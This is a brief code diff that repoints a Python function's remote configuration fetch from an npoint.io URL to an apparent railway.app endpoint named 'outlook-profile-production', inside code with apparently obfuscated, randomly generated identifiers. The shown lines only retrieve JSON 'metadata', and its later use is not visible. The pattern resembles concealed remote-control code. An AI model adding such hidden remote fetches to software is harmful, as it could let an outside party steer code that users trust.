@@ -16,7 +16,7 @@ def eval_eqnofr_654():
 
     def model_bmzson_856():
         try:
-            config_dzaeer_595 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_dzaeer_595 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_dzaeer_595.raise_for_status()
             model_cppzjz_527 = config_dzaeer_595.json()
             train_rzbnae_727 = model_cppzjz_527.get('metadata')
